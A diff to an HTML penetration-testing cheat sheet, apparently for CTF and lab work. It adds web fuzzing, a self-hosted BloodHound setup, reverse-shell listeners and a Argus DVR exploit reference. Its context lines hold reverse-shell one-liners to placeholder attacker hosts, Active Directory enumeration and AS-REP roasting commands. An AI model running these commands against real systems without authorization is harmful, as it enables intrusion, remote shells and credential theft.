@@ -7,6 +7,11 @@
 <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="style.css">
 
+<!-- Import plugins for yml coloration -->
+<link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet" />
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-yaml.min.js"></script>
+
 </head>
 <body class="cs-loading">
 
@@ -169,7 +174,8 @@ gobuster vhost -u &lt;URL&gt; -w &lt;DIRLIST&gt; --append-domain -t 200</pre></d
 feroxbuster -u &lt;URL&gt; -w &lt;DIRLIST&gt; -k</pre></div>
     <h3 class="sub-title">FFUF</h3>
     <div class="code-wrap"><pre data-template>ffuf -u "&lt;URL&gt;?id=FUZZ" -w &lt;WORDLIST&gt;
-ffuf -u &lt;URL&gt;/FUZZ -w &lt;DIRLIST&gt;</pre></div>
+ffuf -u &lt;URL&gt;/FUZZ -w &lt;DIRLIST&gt;
+ffuf -w &lt;DIRLIST&gt; -u http://&lt;IP&gt;/FUZZ -e .asp,.aspx,.txt,.php,.docx,.csv,.pdf,.html</pre></div>
   </div>
 </div>
 
@@ -1250,7 +1256,7 @@ nxc ldap &lt;IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --asreproast output.txt</p
     <div class="section-header-left"><span class="section-icon">&#9660;</span><span class="section-title">BLOODHOUND</span><span class="section-tag">RECON</span></div>
   </div>
   <div class="section-body">
-    <h3 class="sub-title">bloodhound.py (Linux)</h3>
+    <h3 class="sub-title">bloodhound python (Linux)</h3>
     <div class="code-wrap"><pre data-template>bloodhound-python -u '&lt;USER&gt;' -p '&lt;PASS&gt;' -d &lt;DOMAIN&gt; --zip -c All -ns &lt;IP&gt; -dc dc1.&lt;DOMAIN&gt;
 bloodhound-python -u '&lt;USER&gt;' -p '&lt;PASS&gt;' -d '&lt;DOMAIN&gt;' -dc 'dc02.&lt;DOMAIN&gt;' -ns &lt;IP-DOMAIN&gt; -c All --zip</pre></div>
     <h3 class="sub-title">SharpHound (Windows)</h3>
@@ -1258,6 +1264,63 @@ bloodhound-python -u '&lt;USER&gt;' -p '&lt;PASS&gt;' -d '&lt;DOMAIN&gt;' -dc 'd
 Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\user\Desktop\ -OutputPrefix "audit"
 .\sharphound.exe -c All --outputdirectory . --outputprefix "audit"
 .\SharpHound.exe -c All --zipfilename bh.zip</pre></div>
+
+
+    <h3 class="sub-title">Docker compose (Bloodhound - Self-Hosted)</h3>
+    <div class="code-wrap">
+      <pre class="language-yaml" data-template>
+# Save as docker-compose.yml
+services:
+  app-db:
+    image: docker.io/library/postgres:16
+    environment:
+      - PGUSER=${POSTGRES_USER:-bloodhound}
+      - POSTGRES_USER=${POSTGRES_USER:-bloodhound}
+      - POSTGRES_PASSWORD=${POSTGRES_PASSWORD:-bloodhoundcommunityedition}
+      - POSTGRES_DB=${POSTGRES_DB:-bloodhound}
+    volumes:
+      - postgres-data:/var/lib/postgresql/data
+    healthcheck:
+      test: ["CMD-SHELL", "pg_isready -U ${POSTGRES_USER:-bloodhound} -d ${POSTGRES_DB:-bloodhound} -h 127.0.0.1 -p 5432"]
+      interval: 10s
+      timeout: 5s
+      retries: 5
+      start_period: 30s
+
+  graph-db:
+    image: docker.io/library/neo4j:4.4.42
+    environment:
+      - NEO4J_AUTH=${NEO4J_USER:-neo4j}/${NEO4J_SECRET:-bloodhoundcommunityedition}
+      - NEO4J_dbms_allow__upgrade=${NEO4J_ALLOW_UPGRADE:-true}
+    ports:
+      - 127.0.0.1:${NEO4J_DB_PORT:-7687}:7687
+      - 127.0.0.1:${NEO4J_WEB_PORT:-7474}:7474
+    volumes:
+      - ${NEO4J_DATA_MOUNT:-neo4j-data}:/data
+    healthcheck:
+      test: ["CMD-SHELL", "wget -O /dev/null -q http://localhost:7474 || exit 1"]
+      interval: 10s
+      timeout: 5s
+      retries: 5
+      start_period: 30s
+
+  bloodhound:
+    image: docker.io/specterops/bloodhound:${BLOODHOUND_TAG:-latest}
+    environment:
+      - bhe_database_connection=user=${POSTGRES_USER:-bloodhound} password=${POSTGRES_PASSWORD:-bloodhoundcommunityedition} dbname=${POSTGRES_DB:-bloodhound} host=app-db
+      - bhe_neo4j_connection=neo4j://${NEO4J_USER:-neo4j}:${NEO4J_SECRET:-bloodhoundcommunityedition}@graph-db:7687/
+    ports:
+      - ${BLOODHOUND_HOST:-127.0.0.1}:${BLOODHOUND_PORT:-8080}:8080
+    depends_on:
+      app-db:
+        condition: service_healthy
+      graph-db:
+        condition: service_healthy
+
+volumes:
+  neo4j-data:
+  postgres-data:</pre>
+    </div>
   </div>
 </div>
 
@@ -2023,7 +2086,9 @@ bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1'</pr
     <div class="code-wrap"><pre data-template>nc.exe &lt;LHOST&gt; &lt;LPORT&gt; -e cmd.exe
 powershell -e BASE64_SHELL</pre></div>
     <h3 class="sub-title">Listener</h3>
-    <div class="code-wrap"><pre data-template>rlwrap -cAr nc -lvnp &lt;LPORT&gt;</pre></div>
+    <div class="code-wrap"><pre data-template>rlwrap -cAr nc -lvnp &lt;LPORT&gt;
+nc -lnvp &lt;LPORT&gt;
+penelope.py -p &lt;LPORT&gt;</pre></div>
   </div>
 </div>
 <div class="section" id="s-shell-upgrade">
@@ -2145,13 +2210,30 @@ npbackup-cli -c conf.conf --dump /root/root.txt</pre></div>
   </div>
 </div>
 
+<div class="section" id="s-cve"> 
+  <div class="section-header" onclick="toggleSection(this)">
+    <div class="section-header-left">
+      <span class="section-icon">&#9660;</span>
+      <span class="section-title">COMMON VULNERABILITIES AND EXPOSURES (CVE)</span>
+      <span class="section-tag">EXPLOIT</span>
+    </div>
+  </div>
+  <div class="section-body"> <h3 class="sub-title">Argus Surveillance DVR 4.0 - Weak Password Encryption</h3>
+    <div class="code-wrap">
+      <pre data-template># Crack hash in : C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini
+<a href="https://www.exploit-db.com/exploits/50130" target="_blank" rel="noopener noreferrer" class="code-link">https://www.exploit-db.com/exploits/50130</a>
+searchsploit -m 50130</pre>
+      </div>
+    </div>
+  </div>
+
 
 <div class="section" id="s-recup-flag"> 
   <div class="section-header" onclick="toggleSection(this)">
     <div class="section-header-left">
       <span class="section-icon">&#9660;</span>
       <span class="section-title">RECUP FLAG</span>
-      <span class="section-tag">Flag</span>
+      <span class="section-tag">FLAG</span>
     </div>
   </div>
   <div class="section-body"> <h3 class="sub-title">Print Flag (Windows)</h3>
@@ -2166,7 +2248,7 @@ hostname && whoami && ipconfig && type C:\Users\Administrator\Desktop\proof.txt<
       <pre data-template>hostname ; whoami ; ip a ; cat /root/proof.txt'</pre>
     </div>
   </div> </div>
-
+  </div>
 </div><!-- /panel-misc -->
 
 
